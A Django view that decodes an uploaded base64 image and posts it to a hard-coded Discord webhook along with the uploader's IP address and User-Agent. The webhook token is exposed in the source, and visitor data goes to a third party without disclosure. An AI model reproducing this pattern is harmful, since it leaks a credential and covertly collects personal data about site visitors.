import base64
import json
import requests
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1312712494082691134/dyrjnue9Vx9vSw9wQi8ujveS-pgLNYKh5lnH0ZveHeFQ1jPVta7PzPFoGO5olroECOUk'

@csrf_exempt
def upload_image(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            image_data = data.get('image', '').split(',')[1]
            image_bytes = base64.b64decode(image_data)

            # Send the image directly as a file to Discord
            files = {'file': ('image.png', image_bytes, 'image/png')}
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                files=files,
                data={
                    'content': f"New upload received:\nIP Address: {get_client_ip(request)}\nUser-Agent: {request.META.get('HTTP_USER_AGENT', 'Unknown')}"
                }
            )

            if response.status_code == 204:
                return JsonResponse({'message': 'Image and metadata sent to Discord successfully!'})
            else:
                return JsonResponse({'message': f'Failed to send data to Discord. Response: {response.text}'}, status=500)

        except Exception as e:
            return JsonResponse({'message': f'Error: {str(e)}'}, status=500)

    return JsonResponse({'message': 'Invalid request method.'}, status=400)

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR', 'Unknown')
    return ip
